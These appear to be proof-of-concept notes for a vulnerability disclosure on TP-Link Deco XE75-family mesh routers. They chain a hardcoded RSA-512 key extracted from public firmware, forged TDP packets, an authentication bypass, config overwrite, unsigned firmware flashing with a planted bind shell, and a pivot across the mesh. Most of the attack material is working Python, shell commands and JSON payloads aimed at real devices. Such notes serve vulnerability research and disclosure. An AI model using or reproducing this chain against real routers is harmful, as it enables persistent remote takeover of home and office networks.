# PoC Notes — TP-Link Deco XE75 Hardcoded Mesh Group Key → Full Mesh RCE

## Vulnerability Class
Pre-auth Hardcoded RSA-512 Private Key → Post-auth Config Overwrite / Unsigned Firmware Flash / Full Mesh Pivot

## Affected Products
TP-Link Deco XE75 / XE5300 / WE10800  
Firmware: ver1.3.1 Build 20251023 rel.43624  
(XE75_XE5300_WE10800_SP1--ver1-3-1-P1[20251023-rel43624].zip)  
SHA256: d4e923f81042925071be2febb41287d1bfd53166f9e3243ad6ad32bc3252f151

## Transport
UDP 20002 (TDP) / TCP 20002 (TMP)

---

## Step 1: Key Extraction

### Target partition
```
fw_data/user_data/group-info  (UBI partition 27, type=USER_DATA, method=MANU)
```

### Extract from firmware image (no physical device required)
```bash
# Unpack firmware
binwalk -e XE75_XE5300_WE10800_SP1--ver1-3-1-P1[20251023-rel43624].zip
ubireader_extract_images 1814.ubi
unsquashfs squashfs-root.img

# Read group-info
cat squashfs-root/fw_data/user_data/group-info
# Output:
# {"role":"AP",
#  "key":"AAAAB3NzaC1yc2EAAAADAQABAAAAQQC/q1ssRADI/lt3+ZqGrkvGFcsqp2YwaDFm4BftZC17y...",
#  "gid":"70303de6-63d9-11e8-a3f6-0000eb367511"}
```

### Parse RSA private key components
```python
import base64, struct

b64 = "<key field from group-info>"
raw = base64.b64decode(b64)

def read_mpint(data, offset):
    length = struct.unpack(">I", data[offset:offset+4])[0]
    return data[offset+4:offset+4+length], offset+4+length

# Skip key-type field ("ssh-rsa", 4+7 bytes)
offset = 4 + 7
e, offset = read_mpint(raw, offset)   # public exponent = 65537
n, offset = read_mpint(raw, offset)   # 512-bit modulus (64 bytes)
d, offset = read_mpint(raw, offset)   # PRIVATE EXPONENT — present in firmware
p, offset = read_mpint(raw, offset)   # prime p
q, offset = read_mpint(raw, offset)   # prime q

print(f"n = {n.hex()}")
print(f"d = {d.hex()}")   # private key — sufficient to forge any auth response
```

### Verification Goal
- Confirm all private key components (n, e, d, p, q) are extractable from the publicly downloadable firmware image  
- Confirm `gid` value is static: `70303de6-63d9-11e8-a3f6-0000eb367511`  
- Confirm the same key appears in firmware images for XE75, XE5300, and WE10800

---

## Step 2: TDP Packet Forge

### TDP packet structure (from tmpsvr FUN_00111b50)
```
offset 0x00: uint8   version  = 0x02
offset 0x01: uint8   reserved = 0x00
offset 0x02: uint16  opcode   = <target opcode, big-endian>
offset 0x04: uint32  length   = <payload length, big-endian>
offset 0x08: uint32  crc32    = 0x5a6b7c8d (replaced before CRC compute, then overwritten)
offset 0x0C: uint8[] payload
```

### CRC32 computation — no secret key involved
```python
import binascii, socket, struct

def forge_tdp(opcode, payload=b''):
    # Build header with CRC placeholder
    header = struct.pack(">B B H I I",
        0x02,          # version
        0x00,          # reserved
        opcode,        # target opcode
        len(payload),  # payload length
        0x5a6b7c8d     # CRC field replaced with this constant before compute
    )
    pkt = header + payload
    # Compute CRC32 over whole packet, write result into bytes 8-11
    crc = binascii.crc32(pkt) & 0xFFFFFFFF
    return pkt[:8] + struct.pack(">I", crc) + pkt[12:]

# Send to target
pkt = forge_tdp(opcode=0xC404, payload=b'{ ... subconfig JSON ... }')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(pkt, ("192.168.68.1", 20002))
```

### Verification Goal
- Confirm tmpsvr accepts the forged packet (no drop at CRC check)  
- Confirm packet reaches tmp-luci dispatcher (observe `tmp-luci` process forked in /proc)  
- Confirm `opcode_whitelist` is absent in `/etc/config/firewall` (no opcode filtering)

---

## Step 3: sync_slave_check Bypass

### Auth gate summary (discover.lua, offset 12755)
```
recv TDP
  → read_group_info()              ← load RSA key + GID from group-info partition
  → compute group_hid (CRC32)
  → decrypt_table(challenge)       ← RSA private-key decrypt of attacker challenge
  → compare group_id == "70303de6-63d9-11e8-a3f6-0000eb367511"
  → compare config_version
  → PASS → forward to opcode handler
```

### Bypass using extracted private key
```python
# Reconstruct RSA key
n_int = int.from_bytes(n, 'big')
e_int = int.from_bytes(e, 'big')
d_int = int.from_bytes(d, 'big')  # extracted private exponent

# decrypt_table: RSA private decrypt of challenge from target
def decrypt_table(ciphertext_bytes):
    c = int.from_bytes(ciphertext_bytes, 'big')
    m = pow(c, d_int, n_int)       # textbook RSA decrypt
    return m.to_bytes(64, 'big')

# encrypt_table: RSA public encrypt for response
def encrypt_table(plaintext_bytes):
    m = int.from_bytes(plaintext_bytes, 'big')
    c = pow(m, e_int, n_int)       # textbook RSA encrypt
    return c.to_bytes(64, 'big')
```

### Verification Goal
- Initiate a SYNC_DETECT_SLAVE TMP handshake with a target Deco AP  
- Receive encrypted challenge; decrypt using extracted `d`  
- Confirm target proceeds past "group id mismatched" and returns a valid encrypted response  
- Confirm no further authentication gate exists before opcode handler execution

---

## Step 4: Configuration Overwrite (inspect_and_save_subconfig)

### Opcode
`0xC404` (within c401–c40f range registered in op_manager.lua)

### Payload structure
```json
{
  "params": {
    "change": ["firewall", "system"],
    "dev_id": "<target_device_id>",
    "config_version": 1
  },
  "data": {
    "firewall": "<attacker-supplied UCI config content>",
    "system":   "<attacker-supplied UCI config content>"
  }
}
```

### Execution on target (confirmed call chain, op_manager.lua offsets 6946–7437)
```
inspect_and_save_subconfig
  → md5sum /etc/config/* > /tmp/uci_comp_config/uci_show_info_before
  → write attacker-supplied config
  → diff
  → is_user_config → "user config change!"
  → save_config_version
  → CONFIG_LOCK → reload_user_config
  → uci_apply                 ← /etc/config/* overwritten
  → sync_boost_uloop
```

### Verification Goal
- Confirm `/etc/config/firewall` is replaced with attacker-supplied content after opcode delivery  
- Confirm service reload is triggered automatically (e.g., dnsmasq restart visible in syslog)  
- Confirm no secondary authentication gate exists between TDP receipt and `uci_apply`

---

## Step 5: Unsigned Firmware Flash (SYNC_FIRMWARE + SYNC_UPGRADE)

### Attacker-controlled fields in SYNC_FIRMWARE
```json
{
  "params": {
    "check_flag": false,
    "type": "normal"
  },
  "ip":       "<attacker_http_server_ip>",
  "firmware": "<firmware_name_on_attacker_server>",
  "checksum": "<md5_of_malicious_firmware_computed_by_attacker>"
}
```

### Execution sequence on target (lib/sync-server/scripts/firmware — plaintext)
```
sync-server receives SYNC_FIRMWARE
  → downloads firmware from host (attacker-controlled IP)
  → stores at /var/firmwares/<name>
  → md5sum /var/firmwares/<name> == checksum   ← attacker computes and provides this value
  → NO RSA / ECDSA signature verification anywhere in chain

sync-server receives SYNC_UPGRADE
  → flashes /var/firmwares/<name>
  → device reboots into attacker firmware
```

### What to Check
- No `verify_signature` / `rsa_verify` / `openssl verify` call adjacent to `SYNC_FIRMWARE` handler in sync-server binary  
- `lib/sync-server/scripts/firmware`: only `md5sum` integrity check present, no signing step  
- `/var/firmwares/` populated with attacker binary after `SYNC_FIRMWARE` delivery  
- Device boots attacker firmware after `SYNC_UPGRADE` with no recovery prompt

### Verification Goal
- Build a modified firmware image (e.g., add a bind shell to `/etc/rc.local`)  
- Deliver via `SYNC_FIRMWARE` → confirm stored in `/var/firmwares/`  
- Trigger `SYNC_UPGRADE` → confirm flash and reboot  
- Confirm persistent shell access after reboot

---

## Step 6: Full Mesh Pivot via forward_tmp_request

### Opcode
`0xC40B` (c40b–c40f range in op_manager.lua)

### Payload
```json
{
  "opcode":    "0xC404",
  "target_id": "<RE_device_id>",
  "params":    "<attacker config payload>",
  "data":      "<arbitrary>"
}
```

### Execution sequence on target (op_manager.lua offsets 9126–9724)
```
forward_tmp_request
  → write JSON → /tmp/sync-server/forward_tmp_request-<pid>
  → ubus call sync request
  → /lib/sync-server/scripts/request infile outfile 0xC404 <RE_ip1> 1 <RE_ip2> 1 ...
```

### scripts/request (plaintext Lua — confirmed)
```lua
local usr = uci_r:get_profile("accountmgnt", "username")
local pwd = uci_r:get_profile("accountmgnt", "password")
-- Router uses its OWN admin credentials to authenticate to RE nodes
-- Attacker does not need to separately pass sync_slave_check on RE nodes
tmpcli:request(opcode, {infile = infile})
```

### Verification Goal
- Confirm `/tmp/sync-server/forward_tmp_request-<pid>` written with attacker-controlled JSON  
- Confirm RE node receives and processes the forwarded opcode (observe RE config change)  
- Confirm `accountmgnt` credentials are used for RE authentication (no additional auth required)  
- Enumerate all REs via `fetch_subconfig` → reads `/tmp/sync-server/mesh_dev_list` → then pivot to each

---

## Full Attack Chain Summary

```
1. Extract RSA-512 private key offline from publicly downloadable firmware image
        ↓
2. Forge TDP packet (CRC32 recomputable — no secret key)
        ↓
3. Pass sync_slave_check on target AP
   (RSA-decrypt group challenge using extracted private key d)
        ↓
4a. Config overwrite: send opcode 0xC404 → uci_apply → /etc/config/* replaced
        OR
4b. Firmware RCE:
    SYNC_FIRMWARE (host=attacker_ip, checksum=attacker_md5) → target fetches evil.bin
    SYNC_UPGRADE → target flashes evil.bin (no signature check) → persistent root shell
        ↓
5. Mesh pivot: forward_tmp_request → relay any opcode to all RE nodes
   (router's own admin credentials used; no per-RE auth needed)
        ↓
6. All RE nodes compromised in a single operation
```

---

## Key Indicators of Vulnerability

| Indicator | Location | Evidence |
|---|---|---|
| RSA-512 private key in firmware | `fw_data/user_data/group-info` | n, e, d, p, q all present; Dropbear wire format |
| Identical GID across all units | `fw_data/user_data/group-info` | `70303de6-63d9-11e8-a3f6-0000eb367511` hardcoded |
| No opcode whitelist | `/etc/config/firewall` | `opcode_whitelist` option absent |
| No firmware signature check | sync-server binary, scripts/firmware | Only md5sum; no RSA/ECDSA verify call |
| Admin creds used for mesh relay | `lib/sync-server/scripts/request` | `uci_r:get_profile("accountmgnt", "password")` |
| CRC32 uses no secret | tmpsvr FUN_00111b50 | Constant 0x5a6b7c8d substituted before compute |
